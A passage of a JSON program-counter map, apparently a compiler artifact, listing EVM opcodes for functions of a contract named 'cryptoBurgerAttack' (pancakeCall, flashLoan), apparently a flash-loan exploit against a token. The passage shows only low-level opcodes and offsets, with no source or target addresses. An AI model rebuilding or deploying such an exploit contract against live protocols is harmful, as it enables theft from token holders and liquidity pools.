      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x45"
    },
    "64": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "65": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "67": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "DUP1",
      "path": "0"
    },
    "68": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "REVERT",
      "path": "0"
    },
    "69": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "70": {
      "op": "POP"
    },
    "71": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x59"
    },
    "74": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x54"
    },
    "77": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "78": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "80": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2B97"
    },
    "83": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        1927,
        12096
      ],
      "op": "JUMP",
      "path": "0"
    },
    "84": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "85": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x7B"
    },
    "88": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        1927,
        12096
      ],
      "op": "JUMP",
      "path": "0"
    },
    "89": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "90": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "STOP",
      "path": "0"
    },
    "91": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "92": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "CALLVALUE",
      "path": "0"
    },
    "93": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "DUP1",
      "path": "0"
    },
    "94": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "95": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x67"
    },
    "98": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "99": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "101": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "DUP1",
      "path": "0"
    },
    "102": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "REVERT",
      "path": "0"
    },
    "103": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "104": {
      "op": "POP"
    },
    "105": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x59"
    },
    "108": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x76"
    },
    "111": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "112": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "114": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C2D"
    },
    "117": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "jump": "i",
      "offset": [
        1222,
        1921
      ],
      "op": "JUMP",
      "path": "0"
    },
    "118": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "119": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x26E4"
    },
    "122": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "jump": "i",
      "offset": [
        1222,
        1921
      ],
      "op": "JUMP",
      "path": "0"
    },
    "123": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "124": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2089,
        2103
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "126": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2119,
        2129
      ],
      "op": "CALLER",
      "path": "0"
    },
    "127": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "129": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "131": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "133": {
      "op": "SHL"
    },
    "134": {
      "op": "SUB"
    },
    "135": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2137
      ],
      "op": "AND",
      "path": "0"
    },
    "136": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2137
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xDFE1681"
    },
    "141": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "143": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "144": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "DUP2",
      "path": "0"
    },
    "145": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xFFFFFFFF"
    },
    "150": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "AND",
      "path": "0"
    },
    "151": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "153": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "SHL",
      "path": "0"
    },
    "154": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "DUP2",
      "path": "0"
    },
    "155": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "156": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "158": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "ADD",
      "path": "0"
    },
    "159": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "161": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "163": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "164": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "DUP1",
      "path": "0"
    },
    "165": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "DUP4",
      "path": "0"
    },
    "166": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "SUB",
      "path": "0"
    },
    "167": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "DUP2",
      "path": "0"
    },
    "168": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "DUP7",
      "path": "0"
    },
    "169": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "GAS",
      "path": "0"
    },
    "170": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "171": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "172": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "DUP1",
      "path": "0"
    },
    "173": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "174": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xBB"
    },
    "177": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "178": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "179": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "181": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "DUP1",
      "path": "0"
    },
    "182": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "183": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "184": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "186": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "REVERT",
      "path": "0"
    },
    "187": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "188": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "POP",
      "path": "0"
    },
    "189": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "POP",
      "path": "0"
    },
    "190": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "POP",
      "path": "0"
    },
    "191": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "POP",
      "path": "0"
    },
    "192": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "194": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "195": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "196": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "198": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "NOT",
      "path": "0"
    },
    "199": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "201": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "DUP3",
      "path": "0"
    },
    "202": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "ADD",
      "path": "0"
    },
    "203": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "AND",
      "path": "0"
    },
    "204": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "DUP3",
      "path": "0"
    },
    "205": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "ADD",
      "path": "0"
    },
    "206": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "DUP1",
      "path": "0"
    },
    "207": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "209": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "210": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "POP",
      "path": "0"
    },
    "211": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "DUP2",
      "path": "0"
    },
    "212": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "ADD",
      "path": "0"
    },
    "213": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "214": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xDF"
    },
    "217": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "218": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "219": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C59"
    },
    "222": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        2106,
        2139
      ],
      "op": "JUMP",
      "path": "0"
    },
    "223": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2106,
        2139
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "224": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2089,
        2139
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "225": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2089,
        2139
      ],
      "op": "POP",
      "path": "0"
    },
    "226": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2149,
        2163
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "228": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2179,
        2189
      ],
      "op": "CALLER",
      "path": "0"
    },
    "229": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "231": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "233": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "235": {
      "op": "SHL"
    },
    "236": {
      "op": "SUB"
    },
    "237": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2197
      ],
      "op": "AND",
      "path": "0"
    },
    "238": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2197
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xD21220A7"
    },
    "243": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "245": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "246": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "DUP2",
      "path": "0"
    },
    "247": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xFFFFFFFF"
    },
    "252": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "AND",
      "path": "0"
    },
    "253": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "255": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "SHL",
      "path": "0"
    },
    "256": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "DUP2",
      "path": "0"
    },
    "257": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "258": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "260": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "ADD",
      "path": "0"
    },
    "261": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "263": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "265": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "266": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "DUP1",
      "path": "0"
    },
    "267": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "DUP4",
      "path": "0"
    },
    "268": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "SUB",
      "path": "0"
    },
    "269": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "DUP2",
      "path": "0"
    },
    "270": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "DUP7",
      "path": "0"
    },
    "271": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "GAS",
      "path": "0"
    },
    "272": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "273": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "274": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "DUP1",
      "path": "0"
    },
    "275": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "276": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x121"
    },
    "279": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "280": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "281": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "283": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "DUP1",
      "path": "0"
    },
    "284": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "285": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "286": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "288": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "REVERT",
      "path": "0"
    },
    "289": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "290": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "POP",
      "path": "0"
    },
    "291": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "POP",
      "path": "0"
    },
    "292": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "POP",
      "path": "0"
    },
    "293": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "POP",
      "path": "0"
    },
    "294": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "296": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "297": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "298": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "300": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "NOT",
      "path": "0"
    },
    "301": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "303": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "DUP3",
      "path": "0"
    },
    "304": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "ADD",
      "path": "0"
    },
    "305": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "AND",
      "path": "0"
    },
    "306": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "DUP3",
      "path": "0"
    },
    "307": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "ADD",
      "path": "0"
    },
    "308": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "DUP1",
      "path": "0"
    },
    "309": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "311": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "312": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "POP",
      "path": "0"
    },
    "313": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "DUP2",
      "path": "0"
    },
    "314": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "ADD",
      "path": "0"
    },
    "315": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "316": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x145"
    },
    "319": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "320": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "321": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C59"
    },
    "324": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        2166,
        2199
      ],
      "op": "JUMP",
      "path": "0"
    },
    "325": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2166,
        2199
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "326": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "328": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "329": {
      "op": "PUSH4",
      "value": "0xE6A43905"
    },
    "334": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "336": {
      "op": "SHL"
    },
    "337": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "DUP2",
      "path": "0"
    },
    "338": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "339": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "341": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "343": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "345": {
      "op": "SHL"
    },
    "346": {
      "op": "SUB"
    },
    "347": {
      "op": "DUP1"
    },
    "348": {
      "op": "DUP6"
    },
    "349": {
      "op": "AND"
    },
    "350": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "352": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "DUP4",
      "path": "0"
    },
    "353": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "ADD",
      "path": "0"
    },
    "354": {
      "op": "MSTORE"
    },
    "355": {
      "op": "DUP3"
    },
    "356": {
      "op": "AND"
    },
    "357": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "359": {
      "op": "DUP3"
    },
    "360": {
      "op": "ADD"
    },
    "361": {
      "op": "MSTORE"
    },
    "362": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2149,
        2199
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "363": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2149,
        2199
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "364": {
      "op": "POP"
    },
    "365": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2210,
        2222
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "367": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2210,
        2222
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "368": {
      "offset": [
        631,
        673
      ],
      "op": "PUSH20",
      "path": "0",
